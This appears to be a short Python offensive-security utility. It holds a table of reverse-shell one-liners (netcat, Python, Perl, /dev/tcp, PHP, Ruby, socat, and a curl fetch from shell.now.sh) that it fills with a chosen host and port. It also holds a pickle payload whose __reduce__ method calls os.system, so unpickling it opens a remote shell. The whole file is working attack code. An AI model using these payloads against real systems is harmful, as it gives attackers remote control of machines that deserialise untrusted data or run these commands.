import pickle
import os

#taken from https://github.com/lukechilds/reverse-shell
#and http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
#call with str.format(host, port)
rev_shells = {
	"nc":
		"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} > /tmp/f",
	"python":
		"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
	"perl":
		"""perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
	"sh":
		"/bin/sh -i >& /dev/tcp/{}/{} 0>&1",
	"nc2":
		"nc -e /bin/sh {} {}",
	"curl":
		"curl https://shell.now.sh/{}:{}",
	"php":
		"""php -r '$sock=fsockopen("{}",{});exec("/bin/sh -i <&3 >&3 2>&3");'""",
	"ruby":
		"""ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
	"socat":
		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}"
}

def rev_shell(host, port, typ):
	return rev_shells[typ].format(host, port)

class PickleRCE:
	def __init__(self, cmd):
		self.cmd = cmd
	
	def __reduce__(self):
		return os.system, (self.cmd, )

def pickle_rev_shell(host, port, typ="python", protocol=None):
	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
